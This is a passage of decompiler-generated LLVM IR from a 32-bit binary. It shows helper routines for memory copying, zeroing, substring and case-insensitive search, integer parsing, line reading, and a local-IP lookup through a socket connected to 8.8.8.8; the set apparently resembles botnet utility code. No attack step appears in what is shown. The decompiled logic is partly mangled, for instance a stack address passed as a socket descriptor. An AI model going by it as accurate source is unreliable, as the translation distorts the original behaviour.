  br i1 %v2_12db0, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12dbc, %dec_label_pc_12db0
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12db0
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12dbc

dec_label_pc_12dbc:                               ; preds = %dec_label_pc_12dbc, %bb
  %v0_12dbc = phi i32 [ %v1_12dc4, %dec_label_pc_12dbc ], [ 0, %bb ]
  %v2_12dbc = add i32 %v0_12dbc, %arg2
  %v3_12dbc = inttoptr i32 %v2_12dbc to i8*
  %v4_12dbc = load i8, i8* %v3_12dbc, align 1
  %v4_12dc0 = add i32 %v0_12dbc, %arg1
  %v5_12dc0 = inttoptr i32 %v4_12dc0 to i8*
  store i8 %v4_12dbc, i8* %v5_12dc0, align 1
  %v0_12dc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12dc4 = add i32 %v0_12dc4, 1
  store i32 %v1_12dc4, i32* %ip.global-to-local, align 4
  %v9_12dc8 = icmp eq i32 %v1_12dc4, %arg3
  br i1 %v9_12dc8, label %.loopexit, label %dec_label_pc_12dbc

; uselistorder directives
  uselistorder i32 %v1_12dc4, { 1, 2, 0 }
}

define i32 @function_12dd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12dd4:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_12dd4 = icmp eq i32 %arg2, 0
  br i1 %v2_12dd4, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12de4, %dec_label_pc_12dd4
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12dd4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %dec_label_pc_12de4.dec_label_pc_12de4_crit_edge, %bb
  %v2_12de4 = phi i32 [ %v1_12de8, %dec_label_pc_12de4.dec_label_pc_12de4_crit_edge ], [ 0, %bb ]
  %v0_12de4.off0 = phi i8 [ %extract.t, %dec_label_pc_12de4.dec_label_pc_12de4_crit_edge ], [ 0, %bb ]
  %v4_12de4 = add i32 %v2_12de4, %arg1
  %v5_12de4 = inttoptr i32 %v4_12de4 to i8*
  store i8 %v0_12de4.off0, i8* %v5_12de4, align 1
  %v0_12de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_12de8 = add i32 %v0_12de8, 1
  store i32 %v1_12de8, i32* %r3.global-to-local, align 4
  %v9_12dec = icmp eq i32 %v1_12de8, %arg2
  br i1 %v9_12dec, label %.loopexit, label %dec_label_pc_12de4.dec_label_pc_12de4_crit_edge

dec_label_pc_12de4.dec_label_pc_12de4_crit_edge:  ; preds = %dec_label_pc_12de4
  %v0_12de4.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_12de4.pre to i8
  br label %dec_label_pc_12de4

; uselistorder directives
  uselistorder i32 %v1_12de8, { 1, 2, 0 }
}

define i32 @function_12df8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12df8:
  %v7_12e0c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_12e0c, label %dec_label_pc_12e10, label %dec_label_pc_12e18

dec_label_pc_12e10:                               ; preds = %dec_label_pc_12e2c, %dec_label_pc_12df8, %dec_label_pc_12e18
  ret i32 -1

dec_label_pc_12e18:                               ; preds = %dec_label_pc_12df8
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_12e10, label %dec_label_pc_12e20

dec_label_pc_12e20:                               ; preds = %dec_label_pc_12e18
  br label %dec_label_pc_12e38

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e50, %dec_label_pc_12e38
  %v1_12e2c = add i32 %v0_12e58, 1
  %v9_12e30 = icmp eq i32 %v1_12e2c, %arg2
  br i1 %v9_12e30, label %dec_label_pc_12e10, label %dec_label_pc_12e38

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e2c, %dec_label_pc_12e20
  %v0_12e58 = phi i32 [ %v1_12e2c, %dec_label_pc_12e2c ], [ 0, %dec_label_pc_12e20 ]
  %v0_12e44 = phi i32 [ %v1_12e44., %dec_label_pc_12e2c ], [ 0, %dec_label_pc_12e20 ]
  %v2_12e38 = add i32 %v0_12e44, %arg3
  %v3_12e38 = inttoptr i32 %v2_12e38 to i8*
  %v4_12e38 = load i8, i8* %v3_12e38, align 1
  %v2_12e3c = add i32 %v0_12e58, %arg1
  %v3_12e3c = inttoptr i32 %v2_12e3c to i8*
  %v4_12e3c = load i8, i8* %v3_12e3c, align 1
  %v9_12e40 = icmp eq i8 %v4_12e3c, %v4_12e38
  %v1_12e44 = add i32 %v0_12e44, 1
  %v1_12e44. = select i1 %v9_12e40, i32 %v1_12e44, i32 0
  br i1 %v9_12e40, label %dec_label_pc_12e50, label %dec_label_pc_12e2c

dec_label_pc_12e50:                               ; preds = %dec_label_pc_12e38
  %v9_12e50 = icmp eq i32 %v1_12e44., %arg4
  br i1 %v9_12e50, label %dec_label_pc_12e58, label %dec_label_pc_12e2c

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e50
  %v1_12e58 = add i32 %v0_12e58, 1
  ret i32 %v1_12e58

; uselistorder directives
  uselistorder i1 %v9_12e40, { 1, 0 }
  uselistorder i32 %v0_12e44, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12e10, { 0, 2, 1 }
}

define i32 @function_12e60(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12e60:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_12e6c

dec_label_pc_12e6c:                               ; preds = %.thread, %dec_label_pc_12e84, %bb, %dec_label_pc_12e60
  %v0_12e6c = phi i32 [ %tmp, %dec_label_pc_12e60 ], [ %v5_12e6c, %bb ], [ %v5_12e6c, %dec_label_pc_12e84 ], [ %v5_12e6c, %.thread ]
  %v1_12e6c = inttoptr i32 %v0_12e6c to i8*
  %v2_12e6c = load i8, i8* %v1_12e6c, align 1
  %v5_12e6c = add i32 %v0_12e6c, 1
  %v7_12e74 = icmp eq i8 %v2_12e6c, 9
  br i1 %v7_12e74, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12e6c
  br label %dec_label_pc_12e6c

bb:                                               ; preds = %dec_label_pc_12e6c
  %v8_12e78 = icmp eq i8 %v2_12e6c, 32
  br i1 %v8_12e78, label %dec_label_pc_12e6c, label %dec_label_pc_12e84

dec_label_pc_12e84:                               ; preds = %bb
  %v7_12e84 = icmp eq i8 %v2_12e6c, 10
  br i1 %v7_12e84, label %dec_label_pc_12e6c, label %dec_label_pc_12e8c

dec_label_pc_12e8c:                               ; preds = %dec_label_pc_12e84
  %v7_12e8c = icmp eq i8 %v2_12e6c, 45
  br i1 %v7_12e8c, label %dec_label_pc_12f6c, label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e8c
  %v7_12e94 = icmp eq i8 %v2_12e6c, 43
  br i1 %v7_12e94, label %bb54, label %dec_label_pc_12ea4

bb54:                                             ; preds = %dec_label_pc_12e94
  %v2_12e98 = inttoptr i32 %v5_12e6c to i8*
  %v3_12e98 = load i8, i8* %v2_12e98, align 1
  %v6_12e98 = add i32 %v0_12e6c, 2
  br label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %bb54, %dec_label_pc_12e94, %dec_label_pc_12f6c
  %v0_12f5042 = phi i32 [ %v5_12f6c, %dec_label_pc_12f6c ], [ %v5_12e6c, %dec_label_pc_12e94 ], [ %v6_12e98, %bb54 ]
  %v0_12ecc17.in = phi i8 [ %v2_12f6c, %dec_label_pc_12f6c ], [ %v2_12e6c, %dec_label_pc_12e94 ], [ %v3_12e98, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12f6c ], [ 2147483647, %dec_label_pc_12e94 ], [ 2147483647, %bb54 ]
  %v0_12f7c = phi i32 [ 1, %dec_label_pc_12f6c ], [ 0, %dec_label_pc_12e94 ], [ 0, %bb54 ]
  %v2_12eac = urem i32 %storemerge1, %arg2
  %v2_12ebc = udiv i32 %storemerge1, %arg2
  store i32 %v2_12ebc, i32* @lr, align 4
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %.thread8, %dec_label_pc_12ea4
  %v0_12f50 = phi i32 [ %v5_12f50, %.thread8 ], [ %v0_12f5042, %dec_label_pc_12ea4 ]
  %v2_12f4811 = phi i32 [ %v1_12f6429, %.thread8 ], [ 0, %dec_label_pc_12ea4 ]
  %v1_12f24 = phi i32 [ %v0_12f5827, %.thread8 ], [ 0, %dec_label_pc_12ea4 ]
  %v1_12f0c.in = phi i8 [ %v2_12f50, %.thread8 ], [ %v0_12ecc17.in, %dec_label_pc_12ea4 ]
  %v1_12f0c = zext i8 %v1_12f0c.in to i32
  %v1_12ecc = urem i32 %v1_12f0c, 256
  %v1_12ed0 = add nsw i32 %v1_12ecc, -48
  %v1_12ed8 = add nsw i32 %v1_12ecc, -97
  %v1_12edc = add nsw i32 %v1_12f0c, -48
  %v1_12ee0 = add nsw i32 %v1_12ecc, -65
  %tmp77 = icmp ult i32 %v1_12ed0, 10
  br i1 %tmp77, label %dec_label_pc_12f10, label %dec_label_pc_12ee8

dec_label_pc_12ee8:                               ; preds = %dec_label_pc_12ecc
  %v2_12ee8 = icmp ugt i32 %v1_12ee0, 24
  %v7_12ee8 = icmp eq i32 %v1_12ee0, 25
  %v2_12eec = xor i1 %v7_12ee8, true
  %v3_12eec = and i1 %v2_12ee8, %v2_12eec
  br i1 %v3_12eec, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_12ee8
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_12ee8, %bb55
  %v0_12f0021 = phi i32 [ %v1_12edc, %dec_label_pc_12ee8 ], [ 0, %bb55 ]
  %v2_12ef0 = xor i1 %v2_12ee8, true
  %v3_12ef0 = or i1 %v7_12ee8, %v2_12ef0
  br i1 %v3_12ef0, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_12f00 = phi i32 [ %v0_12f0021, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_12eec, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_12ef8 = icmp ugt i32 %v1_12ed8, 24
  %v11_12ef8 = icmp eq i32 %v1_12ed8, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_12efc = phi i1 [ %v7_12ee8, %bb58 ], [ %v11_12ef8, %bb59 ]
  %v0_12efc = phi i1 [ %v2_12ee8, %bb58 ], [ %v6_12ef8, %bb59 ]
  %v2_12efc = xor i1 %v1_12efc, true
  %v3_12efc = and i1 %v0_12efc, %v2_12efc
  br i1 %v3_12efc, label %dec_label_pc_12f58, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %bb60
  %v2_12f00 = icmp eq i32 %v0_12f00, 0
  %. = select i1 %v2_12f00, i32 87, i32 55
  %v2_12f0c = sub nsw i32 %v1_12f0c, %.
  br label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12ecc, %dec_label_pc_12f00
  %v0_12f2437 = phi i32 [ %v1_12ee0, %dec_label_pc_12ecc ], [ %., %dec_label_pc_12f00 ]
  %v3_12f4812 = phi i32 [ %v1_12edc, %dec_label_pc_12ecc ], [ %v2_12f0c, %dec_label_pc_12f00 ]
  %v6_12f14 = icmp slt i32 %v3_12f4812, %arg2
  br i1 %v6_12f14, label %dec_label_pc_12f18, label %dec_label_pc_12f58

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12f10
  %v3_12f18 = icmp uge i32 %v2_12f4811, %v2_12ebc
  %v9_12f18 = icmp eq i32 %v2_12f4811, %v2_12ebc
  %v2_12f1c = xor i1 %v3_12f18, true
  %v3_12f1c = or i1 %v9_12f18, %v2_12f1c
  br i1 %v3_12f1c, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_12f18
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_12f18, %bb63
  %v0_12f2436 = phi i32 [ %v0_12f2437, %dec_label_pc_12f18 ], [ 0, %bb63 ]
  %v2_12f20 = xor i1 %v9_12f18, true
  %v3_12f20 = and i1 %v3_12f18, %v2_12f20
  br i1 %v3_12f20, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_12f24 = phi i32 [ %v0_12f2436, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_12f24, 0
  %v4_12f24 = zext i1 %tmp78 to i32
  %v5_12f24 = or i32 %v0_12f24, %v4_12f24
  %v7_12f24 = icmp eq i32 %v5_12f24, 0
  br i1 %v7_12f24, label %dec_label_pc_12f30, label %.thread8

dec_label_pc_12f30:                               ; preds = %bb66
  %v7_12f40 = icmp sgt i32 %v3_12f4812, %v2_12eac
  br i1 %v7_12f40, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12f30
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_12f30
  %v2_12f44 = icmp eq i1 %v9_12f18, false
  br i1 %v2_12f44, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_12f4813 = mul i32 %v2_12f4811, %arg2
  %v5_12f4814 = add i32 %v3_12f4812, %v4_12f4813
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_12f6429 = phi i32 [ %v2_12f4811, %bb69 ], [ %v2_12f4811, %bb66 ], [ %v5_12f4814, %bb70 ]
  %v0_12f5827 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_12f50 = inttoptr i32 %v0_12f50 to i8*
  %v2_12f50 = load i8, i8* %v1_12f50, align 1
  %v5_12f50 = add i32 %v0_12f50, 1
  br label %dec_label_pc_12ecc

dec_label_pc_12f58:                               ; preds = %dec_label_pc_12f10, %bb60
  %v1_12f58 = icmp slt i32 %v1_12f24, 0
  %v2_12f7c = icmp eq i32 %v0_12f7c, 0
  br i1 %v1_12f58, label %dec_label_pc_12f7c, label %dec_label_pc_12f60

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12f58
  br i1 %v2_12f7c, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_12f60
  %v2_12f64 = sub i32 0, %v2_12f4811
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_12f60, %bb71
  %v23_12f68 = phi i32 [ %v2_12f4811, %dec_label_pc_12f60 ], [ %v2_12f64, %bb71 ]
  ret i32 %v23_12f68

dec_label_pc_12f6c:                               ; preds = %dec_label_pc_12e8c
  %v1_12f6c = inttoptr i32 %v5_12e6c to i8*
  %v2_12f6c = load i8, i8* %v1_12f6c, align 1
  %v5_12f6c = add i32 %v0_12e6c, 2
  br label %dec_label_pc_12ea4

dec_label_pc_12f7c:                               ; preds = %dec_label_pc_12f58
  %.76 = select i1 %v2_12f7c, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_12f18, { 1, 0, 2 }
  uselistorder i1 %v3_12f18, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_12ee8, { 1, 2, 0 }
  uselistorder i1 %v2_12ee8, { 1, 0, 2 }
  uselistorder i32 %v1_12ecc, { 1, 2, 0 }
  uselistorder i32 %v1_12f0c, { 1, 0, 2 }
  uselistorder i32 %v1_12f24, { 1, 0 }
  uselistorder i32 %v2_12f4811, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_12f50, { 1, 0 }
  uselistorder i32 %v2_12ebc, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_12e6c, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_12e6c, { 0, 1, 3, 2 }
  uselistorder i32 25, { 13, 14, 1, 0, 2, 7, 3, 8, 4, 9, 6, 10, 11, 12, 5, 15, 16 }
  uselistorder i32 24, { 37, 38, 13, 10, 65, 42, 70, 43, 44, 58, 62, 40, 41, 66, 45, 46, 47, 14, 48, 15, 49, 16, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 67, 61, 68, 63, 64, 71, 72, 73, 69, 74, 75, 0, 76, 17, 18, 1, 77, 19, 20, 2, 78, 11, 79, 80, 81, 21, 22, 3, 23, 24, 82, 25, 26, 4, 12, 83, 27, 5, 6, 28, 84, 29, 7, 85, 86, 87, 30, 31, 88, 32, 89, 33, 8, 90, 34, 35, 91, 92, 36, 93, 9, 39 }
  uselistorder i8 32, { 1, 7, 2, 3, 0, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i8 9, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_12f10, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_12ea4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e6c, { 1, 2, 0, 3 }
}

define i32 @function_12f8c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12f8c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12f8c = load i32, i32* @r4, align 4
  store i32 %v3_12f8c, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12fa4

dec_label_pc_12fa4:                               ; preds = %dec_label_pc_12fd0.dec_label_pc_12fa4_crit_edge, %dec_label_pc_12f8c
  %v0_12fa8 = phi i32 [ %v0_12fa8.pre, %dec_label_pc_12fd0.dec_label_pc_12fa4_crit_edge ], [ %arg3, %dec_label_pc_12f8c ]
  %v0_12fa4 = phi i32 [ %v1_12fbc, %dec_label_pc_12fd0.dec_label_pc_12fa4_crit_edge ], [ %tmp, %dec_label_pc_12f8c ]
  %v3_12fb0 = inttoptr i32 %v0_12fa4 to i32*
  %v4_12fb0 = call i32 @read(i32 %v0_12fa8, i32* %v3_12fb0, i32 1)
  %v7_12fb4 = icmp eq i32 %v4_12fb0, 1
  %v0_12fb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_12fbc = add i32 %v0_12fb8, 1
  store i32 %v1_12fbc, i32* %r4.global-to-local, align 4
  %v0_12fc4 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_12fb4, label %dec_label_pc_12fc4, label %dec_label_pc_12fdc

dec_label_pc_12fc4:                               ; preds = %dec_label_pc_12fa4
  %v1_12fc4 = add i32 %v0_12fc4, 1
  store i32 %v1_12fc4, i32* %r5.global-to-local, align 4
  %v0_12fc8 = load i32, i32* %r7.global-to-local, align 4
  %v7_12fcc = icmp sgt i32 %v0_12fc8, %v1_12fc4
  br i1 %v7_12fcc, label %dec_label_pc_12fd0, label %dec_label_pc_12fdc

dec_label_pc_12fd0:                               ; preds = %dec_label_pc_12fc4
  %v1_12fd0 = inttoptr i32 %v0_12fb8 to i8*
  %v2_12fd0 = load i8, i8* %v1_12fd0, align 1
  %v7_12fd4 = icmp eq i8 %v2_12fd0, 10
  br i1 %v7_12fd4, label %dec_label_pc_12fdc, label %dec_label_pc_12fd0.dec_label_pc_12fa4_crit_edge

dec_label_pc_12fd0.dec_label_pc_12fa4_crit_edge:  ; preds = %dec_label_pc_12fd0
  %v0_12fa8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12fa4

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12fa4, %dec_label_pc_12fd0, %dec_label_pc_12fc4
  %v0_12fdc = phi i32 [ %v1_12fc4, %dec_label_pc_12fd0 ], [ %v1_12fc4, %dec_label_pc_12fc4 ], [ %v0_12fc4, %dec_label_pc_12fa4 ]
  %v2_12fdc = icmp eq i32 %v0_12fdc, 0
  %v1_12fe0 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_12fdc, i32 0, i32 %v1_12fe0
  %v2_12fe8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12fe8, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_12fbc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 6, 0, 7, 8, 1, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32*, i32)* @read, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12fdc, { 1, 2, 0 }
}

define i32 @function_12fec() local_unnamed_addr {
dec_label_pc_12fec:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 16, i32* %stack_var_-24, align 4
  %v0_12ffc = call i32* @__errno_location()
  store i32 0, i32* %v0_12ffc, align 4
  %v3_13014 = call i32 @socket(i32 2, i32 0, i32 0)
  %v7_13020 = icmp eq i32 %v3_13014, -1
  store i32 %v3_13014, i32* %r5.global-to-local, align 4
  %v2_1302c = load i32, i32* %r4.global-to-local, align 4
  br i1 %v7_13020, label %dec_label_pc_1307c, label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_12fec
  %v7_1302c = shl i32 2056, %v2_1302c
  %v8_1302c = or i32 %v7_1302c, 2056
  %v2_12ff4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_13030 = inttoptr i32 %v2_1302c to %sockaddr*
  store i32 2, i32* %stack_var_-40, align 4
  %v6_1305c = call i32 @connect(i32 %v2_12ff4, %sockaddr* %v1_13030, i32 %v2_1302c)
  %tmp13 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v0_13068 = load i32, i32* %r5.global-to-local, align 4
  %v6_1306c = call i32 @getsockname(i32 %v0_13068, %sockaddr* %tmp13, i32* nonnull %stack_var_-24)
  %v1_13074 = call i32 @close(i32 %v0_13068)
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_12fec, %dec_label_pc_13040
  %v0_1307c = phi i32 [ 0, %dec_label_pc_12fec ], [ %v8_1302c, %dec_label_pc_13040 ]
  ret i32 %v0_1307c

; uselistorder directives
  uselistorder i32 %v2_1302c, { 1, 0, 2 }
  uselistorder i32 %v3_13014, { 1, 0 }
  uselistorder i32 (i32)* @close, { 7, 3, 6, 5, 10, 4, 8, 9, 13, 34, 33, 12, 11, 15, 14, 18, 17, 16, 20, 19, 24, 23, 22, 21, 29, 28, 27, 26, 25, 32, 31, 30, 2, 1, 0, 35 }
  uselistorder i32 (i32, %sockaddr*, i32)* @connect, { 3, 4, 5, 7, 0, 2, 1, 8, 6, 9 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 7, 13, 18, 11, 10, 14, 9, 3, 16, 4, 17, 5, 12, 1, 6, 8, 2, 0, 15, 19 }
  uselistorder i32* ()* @__errno_location, { 3, 2, 4, 5, 6, 1, 0, 7 }
  uselistorder label %dec_label_pc_1307c, { 1, 0 }
}

define i32 @function_13088(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13088:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_1308c = load i8, i8* %tmp, align 1
  %v2_13090 = icmp eq i8 %v3_1308c, 0
  br i1 %v2_13090, label %bb, label %dec_label_pc_130a4

bb:                                               ; preds = %dec_label_pc_13088
  %v4_1308c = zext i8 %v3_1308c to i32
  br label %dec_label_pc_130b8

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13088
  br label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %dec_label_pc_130a8, %dec_label_pc_130a4
  %v0_130a8 = phi i32 [ %v1_130a8, %dec_label_pc_130a8 ], [ 0, %dec_label_pc_130a4 ]
  %v1_130a8 = add i32 %v0_130a8, 1
  %v2_130ac = add i32 %v1_130a8, %arg2
  %v3_130ac = inttoptr i32 %v2_130ac to i8*
  %v4_130ac = load i8, i8* %v3_130ac, align 1
  %v2_130b0 = icmp eq i8 %v4_130ac, 0
  br i1 %v2_130b0, label %dec_label_pc_130b8, label %dec_label_pc_130a8

dec_label_pc_130b8:                               ; preds = %dec_label_pc_130a8, %bb
  %v0_130fc18 = phi i32 [ %v4_1308c, %bb ], [ %v1_130a8, %dec_label_pc_130a8 ]
  %v0_130c01 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_130c01, 1
  br i1 %tmp27, label %dec_label_pc_1310c, label %dec_label_pc_130cc

dec_label_pc_130cc:                               ; preds = %dec_label_pc_130b8, %dec_label_pc_130c0.backedge
  %v0_130c4.in = phi i32 [ %v0_130c4, %dec_label_pc_130c0.backedge ], [ %v0_130c01, %dec_label_pc_130b8 ]
  %v0_130f0 = phi i32 [ %v1_130f0., %dec_label_pc_130c0.backedge ], [ 0, %dec_label_pc_130b8 ]
  %v0_130cc = phi i32 [ %v5_130cc, %dec_label_pc_130c0.backedge ], [ %tmp20, %dec_label_pc_130b8 ]
  %v0_130c4 = add i32 %v0_130c4.in, -1
  %v1_130cc = inttoptr i32 %v0_130cc to i8*
  %v2_130cc = load i8, i8* %v1_130cc, align 1
  %v3_130cc = zext i8 %v2_130cc to i32
  %v5_130cc = add i32 %v0_130cc, 1
  %v2_130d0 = add i32 %v0_130f0, %arg2
  %v3_130d0 = inttoptr i32 %v2_130d0 to i8*
  %v4_130d0 = load i8, i8* %v3_130d0, align 1
  %v6_130d0 = zext i8 %v4_130d0 to i32
  %v1_130d4 = add nsw i32 %v3_130cc, -65
  %v1_130d8 = add nsw i32 %v6_130d0, -65
  %tmp35 = icmp ult i32 %v1_130d4, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_130cc
  %v5_130e0 = or i32 %v3_130cc, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_130cc, %bb28
  %v0_130ec = phi i32 [ %v3_130cc, %dec_label_pc_130cc ], [ %v5_130e0, %bb28 ]
  %tmp36 = icmp ult i32 %v1_130d8, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_130e8 = or i32 %v6_130d0, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_130ec = phi i32 [ %v6_130d0, %bb29 ], [ %v5_130e8, %bb30 ]
  %v9_130ec = icmp eq i32 %v0_130ec, %v1_130ec
  %v1_130f0 = add i32 %v0_130f0, 1
  %v1_130f0. = select i1 %v9_130ec, i32 %v1_130f0, i32 0
  br i1 %v9_130ec, label %dec_label_pc_130fc, label %dec_label_pc_130c0.backedge

dec_label_pc_130c0.backedge:                      ; preds = %bb31, %dec_label_pc_130fc
  %tmp32 = icmp slt i32 %v0_130c4, 1
  br i1 %tmp32, label %dec_label_pc_1310c, label %dec_label_pc_130cc

dec_label_pc_130fc:                               ; preds = %bb31
  %v9_130fc = icmp eq i32 %v0_130fc18, %v1_130f0.
  br i1 %v9_130fc, label %dec_label_pc_13104, label %dec_label_pc_130c0.backedge

dec_label_pc_13104:                               ; preds = %dec_label_pc_130fc
  %v2_13104 = sub i32 %v5_130cc, %tmp20
  ret i32 %v2_13104

dec_label_pc_1310c:                               ; preds = %dec_label_pc_130c0.backedge, %dec_label_pc_130b8
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_130f0., { 1, 0 }
  uselistorder i32 %v0_130cc, { 1, 0 }
  uselistorder i32 %v0_130f0, { 1, 0 }
  uselistorder i8 %v3_1308c, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder i32* @r1, { 1, 16, 17, 2, 3, 4, 13, 14, 0, 5, 6, 7, 8, 9, 10, 11, 12, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder label %dec_label_pc_130c0.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_130cc, { 1, 0 }
}

define i32 @function_13114(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13114:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13114 = load i8, i8* %arg1, align 1
  %v2_13118 = icmp eq i8 %v2_13114, 0
  br i1 %v2_13118, label %bb, label %dec_label_pc_13124

bb:                                               ; preds = %dec_label_pc_13114
  %v3_13114 = zext i8 %v2_13114 to i32
  br label %dec_label_pc_13138

dec_label_pc_13124:                               ; preds = %dec_label_pc_13114
  br label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %dec_label_pc_13128, %dec_label_pc_13124
